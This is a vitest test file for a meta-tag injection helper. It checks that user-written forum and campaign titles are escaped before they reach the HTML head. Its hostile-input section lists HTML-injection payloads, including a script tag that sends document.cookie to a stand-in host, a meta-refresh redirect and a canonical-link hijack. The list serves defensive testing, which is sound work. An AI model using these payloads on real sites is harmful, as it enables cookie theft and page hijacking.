/**
 * Head-tag injection, from the attacker's side.
 *
 * The title and description injected into the shell are not always ours. On
 * /community/post/:id and /campaign/:id they are built from the forum post
 * title and the campaign title, which any signed-in member can write. Until
 * 2026-08-03 the title reached the <title> element unescaped, so a crafted
 * post title could close the element and inject its own head markup, including
 * a rel=canonical ahead of the real one.
 *
 * These tests use the real shell tags from client/index.html.
 */
import { describe, it, expect } from "vitest";
import { injectMetaTags } from "./_core/vite";

const SHELL = `<!doctype html>
<html lang="en">
  <head>
    <title>ReGen Civics: Infinite Game for the ReGenerative Renaissance</title>
    <meta name="description" content="A fund and a game for regenerative land projects." />
    <link rel="canonical" href="https://regencivics.earth/" />
    <meta property="og:url" content="https://regencivics.earth/" />
    <meta property="og:title" content="ReGen Civics" />
    <meta property="og:description" content="A fund and a game." />
    <meta property="og:image" content="https://regencivics.earth/og-default.jpg" />
    <meta name="twitter:url" content="https://regencivics.earth/" />
    <meta name="twitter:title" content="ReGen Civics" />
    <meta name="twitter:description" content="A fund and a game." />
    <meta name="twitter:image" content="https://regencivics.earth/og-default.jpg" />
  </head>
  <body><div id="root"></div></body>
</html>`;

const OK = {
  title: "A normal thread title | ReGen Civics Community",
  description: "Someone asking about water rights on twelve acres.",
  canonical: "https://regencivics.earth/community/post/42",
  ogImage: "https://regencivics.earth/api/og?type=forum&id=42",
};

const count = (html: string, needle: string) => html.split(needle).length - 1;

describe("injectMetaTags, ordinary input", () => {
  const html = injectMetaTags(SHELL, OK);

  it("sets the title, description and canonical", () => {
    expect(html).toContain(`<title>${OK.title}</title>`);
    expect(html).toContain(`content="${OK.description}"`);
    expect(html).toContain(`<link rel="canonical" href="${OK.canonical}"`);
  });

  it("points og and twitter url tags at the same canonical", () => {
    expect(html).toContain(`<meta property="og:url" content="${OK.canonical}"`);
    expect(html).toContain(`<meta name="twitter:url" content="${OK.canonical}"`);
  });

  it("leaves exactly one of every tag it touches", () => {
    for (const needle of [
      "<title>",
      'name="description"',
      'rel="canonical"',
      'property="og:url"',
      'property="og:title"',
      'property="og:description"',
      'property="og:image"',
      'name="twitter:url"',
      'name="twitter:title"',
      'name="twitter:description"',
      'name="twitter:image"',
    ]) {
      expect(count(html, needle), needle).toBe(1);
    }
  });

  it("escapes an ampersand in a server-built url so the attribute stays valid", () => {
    // ogImage carries a query string with &, which belongs as &amp; in HTML.
    expect(html).toContain("type=forum&amp;id=42");
  });
});

describe("injectMetaTags, hostile input", () => {
  // Every payload below is a plausible forum post or campaign title.
  const payloads = {
    canonicalHijack:
      '</title><link rel="canonical" href="https://spam.example/"><title>x',
    metaRefresh:
      '</title><meta http-equiv="refresh" content="0;url=https://spam.example/"><title>x',
    scriptTag: '</title><script>fetch("https://spam.example/"+document.cookie)</script><title>x',
    attributeBreak: 'x" /><link rel="canonical" href="https://spam.example/"><meta foo="',
  };

  // The payload text SHOULD survive, escaped, so a thread genuinely titled
  // "<script> and you" still reads correctly. What must not survive is live
  // markup, so every assertion below is about elements and attributes rather
  // than about substrings.
  const assertInert = (html: string) => {
    expect(count(html, 'rel="canonical"')).toBe(1);
    expect(html).toContain(`<link rel="canonical" href="${OK.canonical}"`);
    expect(html).not.toContain('href="https://spam.example/"');
    expect(count(html, "<title>")).toBe(1);
    expect(count(html, "</title>")).toBe(1);
    expect(html).not.toContain("<script>");
    expect(html).not.toContain('http-equiv="refresh"');
    expect(html).not.toContain("<meta foo=");
    expect(html).not.toContain("<meta x=");
  };

  it.each(Object.entries(payloads))("neutralises the %s payload", (_name, payload) => {
    assertInert(injectMetaTags(SHELL, { ...OK, title: `${payload} | ReGen Civics Community` }));
  });

  it("escapes a hostile description the same way", () => {
    assertInert(
      injectMetaTags(SHELL, {
        ...OK,
        description: '" /><link rel="canonical" href="https://spam.example/"><meta x="',
      }),
    );
  });

  it("keeps the hijack attempt readable as escaped text, not deleted", () => {
    const html = injectMetaTags(SHELL, {
      ...OK,
      title: `${payloads.canonicalHijack} | ReGen Civics Community`,
    });
    expect(html).toContain("&lt;link rel=&quot;canonical&quot;");
  });

  it("keeps the payload visible as text rather than dropping it", () => {
    // Escaping, not stripping: a thread genuinely titled "<script> and you"
    // should still read correctly on the page.
    const html = injectMetaTags(SHELL, { ...OK, title: "<script> and you" });
    expect(html).toContain("<title>&lt;script&gt; and you</title>");
  });

  it("survives a title that is only markup", () => {
    const html = injectMetaTags(SHELL, { ...OK, title: '"><<>>&&' });
    expect(count(html, "<title>")).toBe(1);
    expect(html).toContain("&quot;&gt;&lt;&lt;&gt;&gt;&amp;&amp;");
  });
});
